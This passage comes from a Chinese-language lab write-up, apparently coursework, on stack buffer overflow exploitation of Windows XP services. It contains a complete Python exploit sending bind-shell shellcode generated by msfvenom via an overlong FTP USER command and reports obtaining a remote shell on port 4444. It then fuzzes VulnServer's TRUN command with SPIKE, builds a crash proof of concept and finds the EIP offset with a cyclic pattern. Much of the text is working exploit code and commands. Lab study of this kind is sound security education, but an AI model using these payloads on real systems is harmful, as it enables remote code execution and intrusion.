<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"A"</span>*<span class="number">2004</span> +  <span class="string">b"\x57\xb2\xf8\x77"</span> + badchar +  <span class="string">"C"</span>*(<span class="number">3000</span>-<span class="number">2004</span>-<span class="number">4</span>-<span class="built_in">len</span>(badchar))</span><br></pre></td></tr></tbody></table></figure>
<p>同时在  <code>0x77f8b257</code>  下断点，运行程序，发现果然程序被暂停在 <code>0x77f8b257</code>  地址处，因此此跳转指令 OK</p>
<h3 id="编写shellcode"><a class="markdownIt-Anchor" href="#编写shellcode">#</a> 编写 shellcode</h3>
<p>用 kali 的 msf 工具生成 shellcode</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_bind_tcp exitfunc=thread -b "\x00\x0a\x0d" -f python -v shellcode</span><br></pre></td></tr></tbody></table></figure>
<p>根据 shellcode 修改 poc.py 如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 shellcode（不变）</span></span><br><span class="line">shellcode = <span class="string">b""</span></span><br><span class="line">shellcode += <span class="string">b"\xd9\xc5\xba\x93\xf4\x95\xdd\xd9\x74\x24\xf4"</span></span><br><span class="line">shellcode += <span class="string">b"\x5d\x29\xc9\xb1\x53\x31\x55\x17\x83\xed\xfc"</span></span><br><span class="line">shellcode += <span class="string">b"\x03\xc6\xe7\x77\x28\x14\xef\xfa\xd3\xe4\xf0"</span></span><br><span class="line">shellcode += <span class="string">b"\x9a\x5a\x01\xc1\x9a\x39\x42\x72\x2b\x49\x06"</span></span><br><span class="line">shellcode += <span class="string">b"\x7f\xc0\x1f\xb2\xf4\xa4\xb7\xb5\xbd\x03\xee"</span></span><br><span class="line">shellcode += <span class="string">b"\xf8\x3e\x3f\xd2\x9b\xbc\x42\x07\x7b\xfc\x8c"</span></span><br><span class="line">shellcode += <span class="string">b"\x5a\x7a\x39\xf0\x97\x2e\x92\x7e\x05\xde\x97"</span></span><br><span class="line">shellcode += <span class="string">b"\xcb\x96\x55\xeb\xda\x9e\x8a\xbc\xdd\x8f\x1d"</span></span><br><span class="line">shellcode += <span class="string">b"\xb6\x87\x0f\x9c\x1b\xbc\x19\x86\x78\xf9\xd0"</span></span><br><span class="line">shellcode += <span class="string">b"\x3d\x4a\x75\xe3\x97\x82\x76\x48\xd6\x2a\x85"</span></span><br><span class="line">shellcode += <span class="string">b"\x90\x1f\x8c\x76\xe7\x69\xee\x0b\xf0\xae\x8c"</span></span><br><span class="line">shellcode += <span class="string">b"\xd7\x75\x34\x36\x93\x2e\x90\xc6\x70\xa8\x53"</span></span><br><span class="line">shellcode += <span class="string">b"\xc4\x3d\xbe\x3b\xc9\xc0\x13\x30\xf5\x49\x92"</span></span><br><span class="line">shellcode += <span class="string">b"\x96\x7f\x09\xb1\x32\xdb\xc9\xd8\x63\x81\xbc"</span></span><br><span class="line">shellcode += <span class="string">b"\xe5\x73\x6a\x60\x40\xf8\x87\x75\xf9\xa3\xcf"</span></span><br><span class="line">shellcode += <span class="string">b"\xba\x30\x5b\x10\xd5\x43\x28\x22\x7a\xf8\xa6"</span></span><br><span class="line">shellcode += <span class="string">b"\x0e\xf3\x26\x31\x70\x2e\x9e\xad\x8f\xd1\xdf"</span></span><br><span class="line">shellcode += <span class="string">b"\xe4\x4b\x85\x8f\x9e\x7a\xa6\x5b\x5e\x82\x73"</span></span><br><span class="line">shellcode += <span class="string">b"\xf1\x56\x25\x2c\xe4\x9b\x95\x9c\xa8\x33\x7e"</span></span><br><span class="line">shellcode += <span class="string">b"\xf7\x26\x6c\x9e\xf8\xec\x05\x37\x05\x0f\x38"</span></span><br><span class="line">shellcode += <span class="string">b"\x94\x80\xe9\x50\x34\xc5\xa2\xcc\xf6\x32\x7b"</span></span><br><span class="line">shellcode += <span class="string">b"\x6b\x08\x11\xd3\x1b\x41\x73\xe4\x24\x52\x51"</span></span><br><span class="line">shellcode += <span class="string">b"\x42\xb2\xd9\xb6\x56\xa3\xdd\x92\xfe\xb4\x4a"</span></span><br><span class="line">shellcode += <span class="string">b"\x68\x6f\xf7\xeb\x6d\xba\x6f\x8f\xfc\x21\x6f"</span></span><br><span class="line">shellcode += <span class="string">b"\xc6\x1c\xfe\x38\x8f\xd3\xf7\xac\x3d\x4d\xae"</span></span><br><span class="line">shellcode += <span class="string">b"\xd2\xbf\x0b\x89\x56\x64\xe8\x14\x57\xe9\x54"</span></span><br><span class="line">shellcode += <span class="string">b"\x33\x47\x37\x54\x7f\x33\xe7\x03\x29\xed\x41"</span></span><br><span class="line">shellcode += <span class="string">b"\xfa\x9b\x47\x18\x51\x72\x0f\xdd\x99\x45\x49"</span></span><br><span class="line">shellcode += <span class="string">b"\xe2\xf7\x33\xb5\x53\xae\x05\xca\x5c\x26\x82"</span></span><br><span class="line">shellcode += <span class="string">b"\xb3\x80\xd6\x6d\x6e\x01\xf6\x8f\xba\x7c\x9f"</span></span><br><span class="line">shellcode += <span class="string">b"\x09\x2f\x3d\xc2\xa9\x9a\x02\xfb\x29\x2e\xfb"</span></span><br><span class="line">shellcode += <span class="string">b"\xf8\x32\x5b\xfe\x45\xf5\xb0\x72\xd5\x90\xb6"</span></span><br><span class="line">shellcode += <span class="string">b"\x21\xd6\xb0"</span></span><br><span class="line"><span class="comment"># 返回地址（必须是字节类型）</span></span><br><span class="line">ret_addr = <span class="string">b"\x57\xb2\xf8\x77"</span></span><br><span class="line"><span class="comment">#  payload</span></span><br><span class="line">evil = <span class="string">b"A"</span> * <span class="number">1999</span> + ret_addr + <span class="string">b"\x90"</span> * <span class="number">50</span> + shellcode + <span class="string">b"C"</span> * (<span class="number">3000</span> - <span class="number">1999</span> - <span class="built_in">len</span>(ret_addr) - <span class="number">50</span> - <span class="built_in">len</span>(shellcode))</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'192.168.177.136'</span>, <span class="number">21</span>))</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>).decode())  <span class="comment"># 将字节解码为字符串</span></span><br><span class="line">s.send(<span class="string">b'USER '</span> + evil + <span class="string">b'\r\n'</span>)  <span class="comment"># 全部转为字节</span></span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>).decode())</span><br><span class="line">s.send(<span class="string">b'PASS anonymous\r\n'</span>)  <span class="comment"># 转为字节</span></span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>).decode())</span><br><span class="line">s.close()</span><br></pre></td></tr></tbody></table></figure>
<p>再启动服务器，<a target="_blank" rel="noopener" href="http://xn--poc-bs7ij42a.py">运行 poc.py</a>，发现连接成功</p>
<p><code>netstat -a</code>  查看靶机端口开放状态，发现 4444 端口确实是开放着的</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210174342336.png" alt="image-20241210174342336"></p>
<p>这时候再回到攻击机上 nc 尝试连接</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241210174453666.png" alt="image-20241210174453666"></p>
<p>发现是成功连接上了，并且拿到了靶机的 shell，至此漏洞利用完成</p>
<p>下附一个弹计算机的 shellcode</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python </span><br></pre></td></tr></tbody></table></figure>
<h2 id="vulnserverexe的漏洞挖掘分析与利用"><a class="markdownIt-Anchor" href="#vulnserverexe的漏洞挖掘分析与利用">#</a>  <code>VulnServer.exe</code>  的漏洞挖掘分析与利用</h2>
<p>本实践使用的服务器为存在漏洞的服务器程序 <code>VulnServer.exe</code> ，在靶机（XP）上运行 该程序，该程序启动会开启 9999 端口</p>
<h3 id="确认shellcode空间和eip指令地址"><a class="markdownIt-Anchor" href="#确认shellcode空间和eip指令地址">#</a> 确认 shellcode 空间和 EIP 指令地址</h3>
<p>主机 <code>wireshark</code>  抓包，捕获虚拟机靶机攻击机所在网段的网卡，设置过滤为</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp and ((ip.src == 192.168.177.136 and ip.dst == 192.168.177.128) or (ip.src == 192.168.177.128 and ip.dst == 192.168.177.136))</span><br></pre></td></tr></tbody></table></figure>
<p>kali nc 连接靶机服务器</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241211145257107.png" alt="image-20241211145257107"></p>
<p>kali 用 spike 工具， <code>generic_send_tcp</code>  命令，返回如下</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241211145817631.png" alt="image-20241211145817631"></p>
<p><code>SKIPVAR</code>  表示选择第几个 <code>s_string_variable</code>  开始进行变种测试。这种设置可以使得前 面已经测试过的位置不在重复测试。</p>
<p><code>SKIPSTR</code>  表示从 <code>s_string_variable</code>  的第几个字符开始变种测试。</p>
<p>./generic_send_tcp 192.168.1.100 701 something.spk 0 0  需要.spk 文件。</p>
<p>编写 <code>trun.spk</code>  文件，内容为如下，存放在 <code>~/work/experiment/</code>  文件 夹下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s_readline();  </span><br><span class="line">s_string("TRUN ");  </span><br><span class="line">s_string_variable("LEGEND"); </span><br><span class="line">//这个是fuzz变量，向你的SPKIE中插入一段字符串，字符串"LEGEND"将被用作这个变量的第一次循环，以及其他循环中的s_string_variables 变量。</span><br></pre></td></tr></tbody></table></figure>
<p>再运行下面这条命令</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generic_send_tcp 192.168.177.136 9999 trun.spk 0 0</span><br></pre></td></tr></tbody></table></figure>
<p>此时发现触发了异常</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241211152507223.png" alt="image-20241211152507223"></p>
<p><code>immunitydbg</code> attach 上 <code>vulnserver.exe</code>  进程，再运行一次指令</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241211153151261.png" alt="image-20241211153151261"></p>
<p>通过分析 Kali 发包，找到第一次没有收到 line read=Welcome to Vulnerable Server!  Enter HELP for help. 的行，发现此时 Variablesize= 5004，即意味着当输入字符为 5004 时，出现了崩溃</p>
<p><code>wireshark</code>  查看 tcp 包</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241211153845013.png" alt="image-20241211153845013"></p>
<p>看到这个没有没有 line read=Welcome to Vulnerable Server!  Enter HELP for help 提示信息的行，看到这段信息格式，故可以考虑消息格式可以为 <code>TRUN/.:/</code>  后面跟上 5004 个 A</p>
<p>构建 poc 如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line">poc = <span class="string">b"A"</span> * <span class="number">5004</span>  </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  </span><br><span class="line">connect = s.connect((<span class="string">'192.168.177.136'</span>,<span class="number">9999</span>))  </span><br><span class="line">s.recv(<span class="number">1024</span>)  </span><br><span class="line">s.send(<span class="string">b'TRUN /.:/'</span> + poc +<span class="string">b'\r\n'</span>)  </span><br><span class="line">s.send(<span class="string">b'EXIT'</span> +<span class="string">b'\r\n'</span>) </span><br></pre></td></tr></tbody></table></figure>
<p>开启服务器，运行 poc，出现报错</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241211154606619.png" alt="image-20241211154606619"></p>
<p>EIP=  <code>41414141</code> ，说明存在缓冲区溢出</p>
<h3 id="寻找eip溢出时的内存地址"><a class="markdownIt-Anchor" href="#寻找eip溢出时的内存地址">#</a> 寻找 EIP 溢出时的内存地址</h3>
<p>输入 <code>immunitydbg</code>  如下命令根目录生成 5004 个字节的唯一字符串在文件 <code>pattern.txt</code>  中</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pc 5004</span><br></pre></td></tr></tbody></table></figure>
<p>选择其中 ASCII 码版本</p>
<p>或者 kali</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 5004</span><br></pre></td></tr></tbody></table></figure>
<p>也可以生成如下字符串</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk6Gk7</span><br></pre></td></tr></tbody></table></figure>
<p>修改 <code>poc.py</code>  中的 poc 为如上字符串，在运行，报出异常，此时 EIP= <code>386F4337</code></p>
<p>kali 运行，找到偏移地址为 2003</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset -q 386F4337</span><br></pre></td></tr></tbody></table></figure>
